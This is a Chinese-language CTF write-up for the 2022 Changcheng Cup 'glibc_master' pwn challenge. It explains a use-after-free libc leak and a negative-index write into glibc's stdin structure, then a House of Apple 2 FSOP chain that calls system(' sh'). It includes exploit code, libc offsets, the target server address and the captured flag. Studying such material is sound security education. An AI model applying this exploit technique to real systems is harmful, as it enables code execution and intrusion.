# 2022 长城杯 高校组 glibc_master WP

## 题目信息

- 目标：`49.232.142.230:14294`
- 附件：`glibc_master`（ELF64 PIE，stripped），运行环境 Ubuntu 20.04 / glibc 2.31
- 类型：堆 UAF + 数组负下标 OOB + IO_FILE (House of Apple 2) FSOP
- Flag：`flag{e887a2849d530fd5e7bd9b9983983325}`

## 保护

```
Arch: amd64-64-little
RELRO: Full RELRO
Stack: Canary found
NX: enabled
PIE: enabled
SHSTK/IBT: enabled
```

## 程序分析

菜单程序 `Add / Edit / Show / Delete`，索引 0~23：

- 全局数组：`ptr[24] @ 0x4100`（chunk 指针），`sizes[24] @ 0x40a0`（int 大小）
- `Add`：读 index、size，要求 **1039 <= size <= 1551**（即 chunk 0x420~0x620，**刚好大于 tcache 上限 0x410**），`ptr[i]=malloc(size); sizes[i]=size`
- `Edit`：`read(0, ptr[i], sizes[i])` 逐字节读到换行，然后对每个字节做
  `ptr[i][k] ^= alphabet[k % strlen(alphabet)]`，最后调用一个“清 hook”函数
  （把 `__free_hook/__malloc_hook` 清零）。
- `Show`：`puts(ptr[i])`，全局计数器只有 **3 次**
- `Delete`：`free(ptr[i])`，**不置空指针**

### 关键点 1：base64 字母表其实是 65 个字符

Edit 里在栈上构造的字符串是
`ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/`
后面紧跟一个 `=` 再跟 `\0`。因此 `strlen` 返回 **65**，XOR 密钥是
`alphabet[k % 65]`，而不是常见的 64。若按 64 编码，从第 64 字节起全部错位。
编码时：发送 `want[k] ^ alphabet[k % 65]`。

### 关键点 2：负下标 OOB

`Add/Delete` 用无符号比较（`ja`）拦住了负数，但 **`Edit` 与 `Show` 用有符号
比较（`jg 23`）**，负数可以通过：

```c
if (idx > 23) error;          // signed，idx = -24 合法
sizes[idx];                   // int  *(0x40a0 + 4*idx)
ptr[idx];                     // qword*(0x4100 + 8*idx)
```

`idx = -24` 时：

- `ptr[-24] = *(0x4040) = stdin`（COPY 重定位，指向 libc 的 `_IO_2_1_stdin_`）
- `sizes[-24] = *(0x4040)` 的低 32 位 = stdin 指针低 32 位（很大）

于是 `Edit(-24, data)` 变成 **向 libc 固定地址 `_IO_2_1_stdin_` 写入任意长度数据**
（读到换行为止）的强写原语。

注意：`__free_hook` 等是 COPY 重定位，程序里的副本和 libc 真实 hook 不是一回事，
而且 Edit 末尾还会清副本，所以 hook 路线是陷阱。

### 关键点 3：UAF 泄露 libc

`Delete` 不清空指针，`Show` 仍可读已释放 chunk。分配两个 0x500 的 chunk，
释放第一个（>tcache，进 unsorted bin），其 `fd = main_arena + 0x60`：

```
libc_base = leaked_fd - 0x1ecbe0        # glibc 2.31
```

## 利用思路

1. `Add(0,0x500); Add(1,0x500); Delete(0); Show(0)` → 泄露 libc 基址。
2. 伪造 `_IO_2_1_stdin_`（`fp = libc+0x1ec980`）：
   - `_flags = " sh"`（首字节 0x20：不置 `_IO_NO_WRITES(0x8)`，
     也不置 `_IO_UNBUFFERED(0x2)`，否则进不了 wide 路径；不能直接用 `"sh"`，
     `'s'=0x73` 带 `_IO_UNBUFFERED`）
   - `_IO_write_base=0, _IO_write_ptr=1`（满足 `_IO_flush_all_lockp` 的
     `_mode<=0 && write_ptr>write_base`）
   - `_mode=0`
   - `_wide_data = fp+0xe0`（原 `_IO_wide_data` 位置）
   - `vtable = _IO_wfile_jumps`
   - fake wide_data：`+0x18=0, +0x30=0, +0xe0=fake_wide_vtable`
   - `fake_wide_vtable+0x68 = system`（即 `__doallocate` 槽）
3. `Edit(-24, payload)` 写入 stdin。
4. 触发 `exit()`（菜单里输入非法下标即可），退出时 `_IO_cleanup ->
   _IO_flush_all_lockp` 走到伪造的 stdin：

```
_IO_flush_all_lockp
  -> _IO_OVERFLOW(stdin, EOF)            # vtable = _IO_wfile_jumps
  -> _IO_wfile_overflow
  -> _IO_wdoallocbuf                     # wide_data->_IO_buf_base == NULL
  -> _IO_WDOALLOCATE
  -> *(wide_data->_wide_vtable + 0x68)(fp) = system(fp)
  -> system(" sh")                       # fp 开头就是 " sh"
```

拿到 shell 后 `cat flag*` 读 flag。

> 由于 XOR 密钥是固定的，ASLR 下编码后的 payload 偶尔会含 `\x00`/`\x0a`
> （读会提前结束）。脚本里对 payload 做检查，命中就重连换一个 ASLR 再打，
> 命中率约 85%。

## 攻击链

```
Delete 不置空 -> UAF Show -> libc leak
Edit(-24) 有符号绕过 -> ptr[-24]=stdin -> 任意写 _IO_2_1_stdin_
伪造 _IO_FILE + _IO_wide_data + wide_vtable
exit() -> _IO_flush_all_lockp -> _IO_wfile_overflow -> _IO_wdoallocbuf
       -> _wide_vtable->__doallocate(fp) = system(fp) -> shell -> flag
```

## Exploit

见 `exploits/glibc_master.py`（本地/远程：`python3 glibc_master.py [REMOTE=1]`）。

核心代码：

```python
ALPHA = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
def enc(d):
    return bytes(b ^ ALPHA[i % len(ALPHA)] for i, b in enumerate(d))

# leak
add(0, 0x500); add(1, 0x500); delete(0)
libc_base = u64(show(0).strip(b"\n").ljust(8, b"\x00")) - 0x1ecbe0

# fake _IO_2_1_stdin_
fp = libc_base + 0x1ec980
W  = fp + 0xe0
p  = bytearray(b"\x00" * 0x1c8)
p[0:4] = b" sh\x00"                       # _flags
p[0x20:0x28] = p64(0)                     # _IO_write_base
p[0x28:0x30] = p64(1)                     # _IO_write_ptr
p[0xa0:0xa8] = p64(W)                     # _wide_data
p[0xc0:0xc8] = p64(0)                     # _mode
p[0xd8:0xe0] = p64(libc_base + 0x1e8f60)  # vtable = _IO_wfile_jumps
p[0xe0+0x18:0xe0+0x20] = p64(0)           # wide write_base
p[0xe0+0x30:0xe0+0x38] = p64(0)           # wide buf_base
p[0xe0+0x68:0xe0+0x70] = p64(libc_base + 0x52290)  # __doallocate = system
p[0xe0+0xe0:0xe0+0xe8] = p64(W)           # wide_vtable
edit(-24, bytes(p))
trigger_exit()                            # exit -> FSOP
```

## 运行结果

```
[+] libc base = 0x7fc44f380000
invalid idx
flag{e887a2849d530fd5e7bd9b9983983325}
```
